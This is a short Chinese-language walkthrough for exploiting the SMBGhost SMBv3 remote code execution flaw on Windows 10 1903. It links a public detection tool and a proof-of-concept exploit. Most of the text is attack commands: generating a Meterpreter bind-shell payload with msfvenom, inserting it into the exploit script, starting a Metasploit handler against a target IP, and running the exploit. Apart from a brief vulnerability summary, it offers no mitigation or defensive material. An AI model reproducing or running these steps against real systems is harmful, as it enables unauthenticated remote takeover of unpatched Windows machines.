## 漏洞概述

该漏洞是由于SMBv3协议在处理恶意的压缩数据包时出错所造成的，它可让远程且未经身份验证的攻击者在目标系统上执行任意代码。

## 影响版本

Windows 10 1903版（用于基于x64的系统）

Windows 10 1903版（用于基于ARM64的系统）

## 漏洞验证

本地测试需关闭win10防火墙成可ping通状态

gitHub检测工具：https://github.com/ollypwn/SMBGhost

Exp地址：https://github.com/chompie1337/SMBGhost_RCE_PoC

使用msf生成shellcode

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp lport=3333 -f py -o shellcode.txt
```

执行该命令后会在桌面生成一个shellcode.txt

将生成的shellcode替换exp中的exploit.py中的USER_PAYLOAD保存即可

使用kaili中的msf开启监听

```bash
msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp  #设置反弹模式

msf5 exploit(multi/handler) > set rhost 192.168.31.137  #设置目标靶机IP地址

msf5 exploit(multi/handler) > set lport 3333  #设置监听端口

msf5 exploit(multi/handler) > exploit 
```

在kail中进入exp文件夹，执行exp文件

```bash
python3 exploit.py ip 192.168.31.137
```

